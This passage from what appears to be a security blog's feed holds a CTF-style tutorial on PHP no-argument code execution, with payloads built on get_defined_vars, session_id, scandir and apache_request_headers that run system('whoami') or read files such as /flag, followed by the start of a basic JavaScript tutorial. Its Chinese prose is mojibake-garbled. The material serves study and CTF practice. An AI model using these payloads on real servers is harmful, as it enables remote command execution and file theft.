title="get_defined_vars()"></a>get_defined_vars()</h2><p><strong>get_defined_vars():</strong></p><pre><code>è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼Œä¼šè¿”å›$_GET,$_POST,$_COOKIE,$_FILESå…¨å±€å˜é‡çš„å€¼ï¼Œè¿”å›æ•°ç»„é¡ºåºä¸ºget-&gt;post-&gt;cookie-&gt;files</code></pre><p><strong>current:</strong></p><pre><code>è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå•å…ƒï¼Œä¹Ÿå°±æ˜¯ä¼šè¿”å›$_GETå˜é‡çš„æ•°ç»„å€¼</code></pre><p><strong>payload1</strong></p><pre><code>?code=eval(end(current(get_defined_vars())));&amp;flag=system(&#39;whoami&#39;);</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001923627.png" alt="image-20220411001923627"></p><p><strong>payload2</strong></p><pre><code>?flag=system(&#39;whoami&#39;);&amp;code=eval(reset(current(get_defined_vars())));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002114740.png" alt="image-20220411002114740"></p><p><strong>payload3</strong></p><pre><code>?flag=phpinfo();&amp;code=eval(pos(pos(get_defined_vars())));</code></pre><p><strong>poså‡½æ•°:</strong></p><pre><code>pos()æ˜¯PHPä¸­çš„å†…ç½®å‡½æ•°ï¼Œç”¨äºè¿”å›å†…éƒ¨æŒ‡é’ˆå½“å‰æŒ‡å‘çš„æ•°ç»„ä¸­å…ƒç´ çš„å€¼ã€‚è¿”å›å€¼åï¼Œpos()å‡½æ•°ä¸ä¼šé€’å¢æˆ–é€’å‡å†…éƒ¨æŒ‡é’ˆã€‚</code></pre><p>è§£é‡Šä¸‹è¿™ä¸ªpayload</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002640375.png" alt="image-20220411002640375"></p><p>æˆ‘ä»¬å‘ç°flagçš„å€¼æ˜¯è¢«åµŒå¥—åœ¨ä¸¤ä¸ªæ•°ç»„ä¸­ï¼Œå› æ­¤å¦‚æœè¦å–å‡ºflagçš„å€¼ï¼Œè¦æ‰§è¡Œä¸¤æ¬¡pos</p><p>ç¬¬ä¸€æ¬¡posï¼š</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002803950.png" alt="image-20220411002803950"></p><p>ç¬¬äºŒæ¬¡posï¼š</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002837861.png" alt="image-20220411002837861"></p><p>æˆåŠŸå–å‡ºï¼ŒåŠ ä¸Ševalå‡½æ•°å°±å¯ä»¥æ‰§è¡Œäº†</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002921084.png" alt="image-20220411002921084"></p><p><strong>payload4</strong></p><pre><code class="python">import requestsfiles = &#123;   &quot;system(&#39;whoami&#39;);&quot;: &quot;&quot;&#125;#data = &#123;#&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;#&#125;r = requests.post(&#39;http://your_vps_ip/1.php?code=eval(pos(pos(end(get_defined_vars()))));&#39;, files=files)print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;))</code></pre><p><code>è€Œå¦‚æœç½‘ç«™å¯¹$_GET,$_POST,$_COOKIEéƒ½åšçš„è¿‡æ»¤ï¼Œ é‚£æˆ‘ä»¬åªèƒ½ä»$_FILESå…¥æ‰‹äº†ï¼Œfileæ•°ç»„åœ¨æœ€åä¸€ä¸ªï¼Œéœ€è¦endå®šä½ï¼Œç„¶åposä¸¤æ¬¡å®šä½è·å¾—æ–‡ä»¶å</code></p><h2 id="session-start-å‡½æ•°"><a href="#session-start-å‡½æ•°" class="headerlink" title="session_start()å‡½æ•°"></a>session_start()å‡½æ•°</h2><p>é€‚ç”¨äºï¼šphp7ä»¥ä¸‹çš„ç‰ˆæœ¬</p><p><strong>session_start()</strong></p><pre><code>å¯åŠ¨æ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯ï¼ŒæˆåŠŸå¼€å§‹ä¼šè¯è¿”å› TRUE ï¼Œåä¹‹è¿”å› FALSE,è¿”å›å‚æ•°ç»™session_id()</code></pre><p><strong>session_id()</strong></p><pre><code>è·å–/è®¾ç½®å½“å‰ä¼šè¯ IDï¼Œè¿”å›å½“å‰ä¼šè¯IDã€‚ å¦‚æœå½“å‰æ²¡æœ‰ä¼šè¯ï¼Œåˆ™è¿”å›ç©ºå­—ç¬¦ä¸²ï¼ˆâ€â€ï¼‰</code></pre><p>å¯ä»¥ç”¨è¿™ä¸ªå‡½æ•°æ¥è·å–cookieä¸­çš„<code>phpsessionid</code>äº†ï¼Œå¹¶ä¸”è¿™ä¸ªå€¼æˆ‘ä»¬æ˜¯å¯æ§çš„ã€‚</p><p>ä½†å…¶æœ‰é™åˆ¶ï¼š</p><p><strong>æ–‡ä»¶ä¼šè¯ç®¡ç†å™¨ä»…å…è®¸ä¼šè¯ ID ä¸­ä½¿ç”¨ä»¥ä¸‹å­—ç¬¦ï¼ša-z A-Z 0-9 ,ï¼ˆé€—å·ï¼‰å’Œ - ï¼ˆå‡å·ï¼‰</strong></p><p>è§£å†³æ–¹æ³•ï¼šå°†å‚æ•°è½¬åŒ–ä¸º16è¿›åˆ¶ä¼ è¿›å»ï¼Œä¹‹åå†ç”¨hex2bin()å‡½æ•°è½¬æ¢å›æ¥å°±å¯ä»¥äº†ã€‚</p><p><strong>hex2bin()</strong></p><pre><code>è½¬æ¢16è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</code></pre><h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><p>payload</p><pre><code>?code=eval(hex2bin(session_id(session_start()))); HTTP/1.1Cookie: PHPSESSID=73797374656d282777686f616d6927293b  # system(&#39;whoami&#39;);</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411010515707.png" alt="image-20220411010515707"></p><h3 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h3><pre><code> show_source(session_id(session_start())); var_dump(file_get_contents(session_id(session_start()))); highlight_file(session_id(session_start())); readfile(session_id(session_start())); ç„¶åæŠ“åŒ…ä¼ å…¥Cookie: PHPSESSID=(æƒ³è¯»çš„æ–‡ä»¶)å³å¯</code></pre><p>payload</p><pre><code>GET /1.php?code=show_source(session_id(session_start())); HTTP/1.1Cookie: PHPSESSID=/flag</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/20220109194247-442d62d6-7141-1.png" alt="img"></p><p>è¿™ç§æ–¹æ³•æˆ‘å¹¶æ²¡æœ‰æµ‹è¯•æˆåŠŸï¼Œå…ˆå†™ä¸‹æ¥å§ã€‚</p><h2 id="scandir"><a href="#scandir" class="headerlink" title="scandir"></a>scandir</h2><p><strong>æŸ¥çœ‹å½“å‰ç›®å½•æ–‡ä»¶å</strong></p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011259622.png" alt="image-20220411011259622"></p><p>æ–‡ä»¶è¯»å–</p><p><strong>è¯»å–å½“å‰ç›®å½•æ–‡ä»¶</strong></p><pre><code>å½“å‰ç›®å½•å€’æ•°ç¬¬ä¸€ä½æ–‡ä»¶ï¼šshow_source(end(scandir(getcwd())));show_source(current(array_reverse(scandir(getcwd()))));å½“å‰ç›®å½•å€’æ•°ç¬¬äºŒä½æ–‡ä»¶ï¼šshow_source(next(array_reverse(scandir(getcwd()))));éšæœºè¿”å›å½“å‰ç›®å½•æ–‡ä»¶ï¼šhighlight_file(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(current(localeconv())))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011558669.png" alt="image-20220411011558669"></p><p>å¤šè¯•å‡ æ¬¡</p><p><strong>æŸ¥çœ‹ä¸Šä¸€çº§ç›®å½•æ–‡ä»¶å</strong></p><pre><code>print_r(scandir(dirname(getcwd())));print_r(scandir(next(scandir(getcwd()))));print_r(scandir(next(scandir(getcwd()))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011321325.png" alt="image-20220411011321325"></p><p>å‡½æ•°è§£é‡Š</p><pre><code>array_flip()ï¼šäº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼ŒæˆåŠŸæ—¶è¿”å›äº¤æ¢åçš„æ•°ç»„ï¼Œå¦‚æœå¤±è´¥è¿”å› NULLã€‚array_rand()ï¼šä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒï¼Œå¦‚æœåªå–å‡ºä¸€ä¸ª(é»˜è®¤ä¸º1)ï¼Œarray_rand() è¿”å›éšæœºå•å…ƒçš„é”®åã€‚ å¦åˆ™å°±è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚ å®Œæˆåï¼Œå°±å¯ä»¥æ ¹æ®éšæœºçš„é”®è·å–æ•°ç»„çš„éšæœºå€¼ã€‚array_flip()å’Œarray_rand()é…åˆä½¿ç”¨å¯éšæœºè¿”å›å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ådirname(chdir(dirname()))é…åˆåˆ‡æ¢æ–‡ä»¶è·¯å¾„</code></pre><p><strong>æŸ¥çœ‹å’Œè¯»å–æ ¹ç›®å½•æ–‡ä»¶</strong></p><p>æ‰€è·å¾—çš„å­—ç¬¦ä¸²ç¬¬ä¸€ä½æœ‰å‡ ç‡æ˜¯/ï¼Œéœ€è¦å¤šè¯•å‡ æ¬¡</p><pre><code>print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011343731.png" alt="image-20220411011343731"></p><h1 id="ctfé¢˜ç›®è®²è§£"><a href="#ctfé¢˜ç›®è®²è§£" class="headerlink" title="ctfé¢˜ç›®è®²è§£"></a>ctfé¢˜ç›®è®²è§£</h1><h2 id="NoRce"><a href="#NoRce" class="headerlink" title="NoRce"></a>NoRce</h2><p>æºç ï¼š</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);$exp = $_GET[&#39;exp&#39;];//php7.3 + Apacheif(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $exp)) &#123;    if(!preg_match(&quot;/o|v|b|print|var|time|file|sqrt|path|dir|exp|pi|an|na|en|ex|et|na|dec|true|false|[0-9]/i&quot;, $exp))&#123;        eval($exp);    &#125;else&#123;        exit(&#39;NoNoNo,U R Hacker~&#39;);    &#125;&#125;else&#123;    exit(&quot;What&#39;s this?&quot;);&#125;?&gt;</code></pre><p>è¿‡æ»¤ç›¸å½“ä¸¥æ ¼</p><p>æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°</p><pre><code>apache_request_headers();</code></pre><p>æ²¡æœ‰è¢«è¿‡æ»¤</p><p>æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨å…¶å®ƒå‡ ä¸ªæ²¡æœ‰è¢«è¿‡æ»¤çš„å‡½æ•°æ„é€ payload</p><pre><code>die() å‡½æ•°è¾“å‡ºä¸€æ¡æ¶ˆæ¯ï¼Œå¹¶é€€å‡ºå½“å‰è„šæœ¬array_shift() - åˆ é™¤æ•°ç»„ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¢«åˆ é™¤å…ƒç´ çš„å€¼</code></pre><p>åœ¨æˆ‘çš„ç”µè„‘ä¸­ï¼Œéœ€è¦æŠŠflagå¤´ï¼Œæ”¾åœ¨hostå‰ï¼Œå…·ä½“åŸå› æœªçŸ¥</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411013150830.png" alt="image-20220411013150830"></p><p>æ­¤æ—¶arry_shift()è¿”å›çš„å€¼å°±æ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤</p><p>payload</p><pre><code>?exp=system(array_shift(apache_request_headers()));# postflag: whoami</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411013259840.png" alt="image-20220411013259840"></p><p>æˆåŠŸæ‰§è¡Œå‘½ä»¤</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;ç¯å¢ƒå‡†å¤‡&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒå‡†å¤‡&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒå‡†å¤‡&quot;&gt;&lt;/a&gt;ç¯å¢ƒå‡†å¤‡&lt;/h1&gt;&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php
highlight_file(__FIL</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="å¸¸è§æ¼æ´å’Œæ‰‹æ³•" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="ä»£ç æ‰§è¡Œ" scheme="https://sakurahack-y.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>æµ…å­¦javascript</title>
    <link href="https://sakurahack-y.github.io/2022/04/07/%E6%B5%85%E5%AD%A6javascript/"/>
    <id>https://sakurahack-y.github.io/2022/04/07/%E6%B5%85%E5%AD%A6javascript/</id>
    <published>2022-04-07T13:25:06.000Z</published>
    <updated>2022-04-11T07:29:26.288Z</updated>
    
    <content type="html"><![CDATA[<p>è¯¥æ¥çš„æ°¸è¿œè·‘ä¸æ‰ï¼Œè¯¥è¡¥çš„æ—©æ™šè¦è¡¥ï¼Œè¯¶ï¼Œå¥½å¥½å­¦javascriptï¼Œæˆ‘çˆ±å­¦ä¹ ï¼ï¼ï¼ï¼ï¼</p><p>[TOC]</p><h1 id="å†å²"><a href="#å†å²" class="headerlink" title="å†å²"></a>å†å²</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407213804320.png" alt="image-20220407213804320"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407213723069.png" alt="image-20220407213723069"></p><h1 id="javascriptçš„ç»„æˆéƒ¨åˆ†"><a href="#javascriptçš„ç»„æˆéƒ¨åˆ†" class="headerlink" title="javascriptçš„ç»„æˆéƒ¨åˆ†"></a>javascriptçš„ç»„æˆéƒ¨åˆ†</h1><p>htmlæ˜¯éª¨æ¶ï¼Œcssæ˜¯å¯¹é¡µé¢è¿›è¡Œæ¸²æŸ“ï¼Œjsç»å¯¹è¿™ä¸ªé¡µé¢å¯ä»¥åšä»€ä¹ˆ</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407213908008.png" alt="image-20220407213908008"></p><p>javascriptç”±BOM,DMO,ECMAScriptç»„æˆ </p><p><strong>BOM</strong></p><p>å…¨å-Browser Object Model,æŒ‡çš„æ˜¯jsæ“ä½œæµè§ˆå™¨å‘é€å˜åŒ–çš„å±æ€§å’Œæ–¹æ³•</p><p><strong>DOM</strong></p><p>å…¨å-Document Object Model,æŒ‡çš„æ˜¯æ“ä½œæ–‡æ¡£æµå‘ç”Ÿå˜åŒ–çš„å±æ€§å’Œæ–¹æ³•</p><p><strong>ECMAScript</strong></p><p>æŒ‡çš„æ˜¯JSä»£ç çš„ä¹¦å†™è¯­æ³•å’Œä¹¦å†™è§„åˆ™</p><h1 id="JavaScript-ä¹¦å†™ä½ç½®"><a href="#JavaScript-ä¹¦å†™ä½ç½®" class="headerlink" title="JavaScript ä¹¦å†™ä½ç½®"></a>JavaScript ä¹¦å†™ä½ç½®</h1><p><strong>è¡Œå†…å¼</strong></p><p>aæ ‡ç­¾-ä¹¦å†™åœ¨hrefå±æ€§ä¸Š</p><pre><code class="javascript">&lt;a href=&quot;javascript: JSä»£ç ;&quot;&gt;ç‚¹æˆ‘ä¸€ä¸‹&lt;/a&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407215348244.png" alt="image-20220407215348244"></p><p>éaæ ‡ç­¾-ä¹¦å†™åœ¨è¡Œä¸ºå±æ€§ä¸Š</p><pre><code class="javascript">&lt;div onclick=&quot;alert(&#39;hello word&#39;)&quot;&gt;ç‚¹æˆ‘ä¸€ä¸‹&lt;/div&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407215601888.png" alt="image-20220407215601888"></p><p><strong>å†…åµŒå¼</strong></p><p>æŠŠä»£ç ä¹¦å†™åœ¨ä¸€ä¸ªscriptæ ‡ç­¾å¯¹é‡Œé¢,ä¸éœ€è¦ä¾èµ–ä»»ä½•è¡Œä¸ºï¼Œæ‰“å¼€ç½‘é¡µå°±ä¼šæ‰§è¡Œ</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407215824582.png" alt="image-20220407215824582"></p><p><strong>å¤–é“¾å¼</strong></p><p>æŠŠä»£ç ä¹¦å†™åœ¨ä¸€ä¸ª.jsæ–‡ä»¶å†…ï¼Œå¤–é“¾å¼jsä»£ç ï¼Œä¸éœ€è¦ä¾èµ–ä»»ä½•è¡Œä¸ºï¼Œæ‰“å¼€é¡µé¢å°±ä¼šæ‰§è¡Œ</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407220351326.png" alt="image-20220407220351326"></p><h1 id="JavaScriptå®šä¹‰å˜é‡"><a href="#JavaScriptå®šä¹‰å˜é‡" class="headerlink" title="JavaScriptå®šä¹‰å˜é‡"></a>JavaScriptå®šä¹‰å˜é‡</h1><pre><code class="javascript">var num = 100</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407220943173.png" alt="image-20220407220943173"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407220903524.png" alt="image-20220407220903524"></p><h1 id="ä¸‰ç§è¾“å‡ºæ–¹å¼"><a href="#ä¸‰ç§è¾“å‡ºæ–¹å¼" class="headerlink" title="ä¸‰ç§è¾“å‡ºæ–¹å¼"></a>ä¸‰ç§è¾“å‡ºæ–¹å¼</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221044266.png" alt="image-20220407221044266"></p><h1 id="JSçš„æ•°æ®ç±»å‹"><a href="#JSçš„æ•°æ®ç±»å‹" class="headerlink" title="JSçš„æ•°æ®ç±»å‹"></a>JSçš„æ•°æ®ç±»å‹</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221242187.png" alt="image-20220407221242187"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221932277.png" alt="image-20220407221932277"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221440539.png" alt="image-20220407221440539"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221511452.png" alt="image-20220407221511452"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221817260.png" alt="image-20220407221817260"></p><h1 id="JavaScriptæ•°æ®ç±»å‹è½¬æ¢"><a href="#JavaScriptæ•°æ®ç±»å‹è½¬æ¢" class="headerlink" title="JavaScriptæ•°æ®ç±»å‹è½¬æ¢"></a>JavaScriptæ•°æ®ç±»å‹è½¬æ¢</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222131138.png" alt="image-20220407222131138"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222415779.png" alt="image-20220407222415779"></p><p>å½“å¯ä»¥åˆæ³•è½¬æ¢å°±æ­£å¸¸è½¬æ¢ï¼Œå½“æ— æ³•åˆæ³•è½¬æ¢æ—¶ï¼Œå€¼å°±å˜ä¸ºNAN</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407230433762.png" alt="image-20220407230433762"></p><p>å½“å¯ä»¥åˆæ³•è½¬æ¢å°±æ­£å¸¸è½¬æ¢ï¼Œå½“æ— æ³•åˆæ³•è½¬æ¢æ—¶ï¼Œå¦‚æœåŸå€¼ä»¥å­—æ¯ï¼Œåˆ™è¿”å›å€¼ä¸ºNANï¼Œå¦‚æœåŸå€¼ä»¥æ•°å­—+å­—ç¬¦ä¸²å¼€å¤´ï¼Œåˆ™è¿”å›å‰é¢çš„æ•°å­—è€Œå¿½ç•¥å­—ç¬¦ä¸²</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222543001.png" alt="image-20220407222543001"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222630874.png" alt="image-20220407222630874"></p><h1 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407230952623.png" alt="image-20220407230952623"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231034790.png" alt="image-20220407231034790"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231109372.png" alt="image-20220407231109372"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231129915.png" alt="image-20220407231129915"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231232353.png" alt="image-20220407231232353"></p><h1 id="æ¡ä»¶åˆ†æ”¯è¯­å¥"><a href="#æ¡ä»¶åˆ†æ”¯è¯­å¥" class="headerlink" title="æ¡ä»¶åˆ†æ”¯è¯­å¥"></a>æ¡ä»¶åˆ†æ”¯è¯­å¥</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231403054.png" alt="image-20220407231403054"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231436373.png" alt="image-20220407231436373"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231551013.png" alt="image-20220407231551013"></p><h1 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232532028.png" alt="image-20220407232532028"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232436701.png" alt="image-20220407232436701"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232646209.png" alt="image-20220407232646209"></p><h1 id="é€’å½’å‡½æ•°"><a href="#é€’å½’å‡½æ•°" class="headerlink" title="é€’å½’å‡½æ•°"></a>é€’å½’å‡½æ•°</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232807115.png" alt="image-20220407232807115"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232828922.png" alt="image-20220407232828922"></p><h1 id="ä½œç”¨åŸŸ"><a href="#ä½œç”¨åŸŸ" class="headerlink" title="ä½œç”¨åŸŸ"></a>ä½œç”¨åŸŸ</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232920259.png" alt="image-20220407232920259"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233013700.png" alt="image-20220407233013700"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233022496.png" alt="image-20220407233022496"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233059818.png" alt="image-20220407233059818"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233136738.png" alt="image-20220407233136738"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233201625.png" alt="image-20220407233201625"></p><h1 id="å¯¹è±¡æ•°æ®ç±»å‹"><a href="#å¯¹è±¡æ•°æ®ç±»å‹" class="headerlink" title="å¯¹è±¡æ•°æ®ç±»å‹"></a>å¯¹è±¡æ•°æ®ç±»å‹</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233307155.png" alt="image-20220407233307155"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233549115.png" alt="image-20220407233549115"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233644769.png" alt="image-20220407233644769"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233455066.png" alt="image-20220407233455066"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233504184.png" alt="image-20220407233504184"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233523944.png" alt="image-20220407233523944"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233615368.png" alt="image-20220407233615368"></p><h1 id="æ•°ç»„æ•°æ®ç±»å‹"><a href="#æ•°ç»„æ•°æ®ç±»å‹" class="headerlink" title="æ•°ç»„æ•°æ®ç±»å‹"></a>æ•°ç»„æ•°æ®ç±»å‹</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233743737.png" alt="image-20220407233743737"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233840225.png" alt="image-20220407233840225"></p><h1 id="æ•°ç»„å¸¸ç”¨æ–¹æ³•"><a href="#æ•°ç»„å¸¸ç”¨æ–¹æ³•" class="headerlink" title="æ•°ç»„å¸¸ç”¨æ–¹æ³•"></a>æ•°ç»„å¸¸ç”¨æ–¹æ³•</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000927943.png" alt="image-20220408000927943"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234008850.png" alt="image-20220407234008850"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234023183.png" alt="image-20220407234023183"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234038569.png" alt="image-20220407234038569"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234054841.png" alt="image-20220407234054841"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234110601.png" alt="image-20220407234110601"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234132600.png" alt="image-20220407234132600"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234420968.png" alt="image-20220407234420968"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234514112.png" alt="image-20220407234514112"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234540680.png" alt="image-20220407234540680"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234754392.png" alt="image-20220407234754392"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234822279.png" alt="image-20220407234822279"></p><p>åŒ…å‰ä¸åŒ…å</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000322543.png" alt="image-20220408000322543"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000514401.png" alt="image-20220408000514401"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000635298.png" alt="image-20220408000635298"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000653869.png" alt="image-20220408000653869"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000714136.png" alt="image-20220408000714136"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000753278.png" alt="image-20220408000753278"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000801246.png" alt="image-20220408000801246"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001013869.png" alt="image-20220408001013869"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001035076.png" alt="image-20220408001035076"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000830365.png" alt="image-20220408000830365"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000847454.png" alt="image-20220408000847454"></p><h1 id="å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•"><a href="#å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•" class="headerlink" title="å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•"></a>å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•</h1><p><img 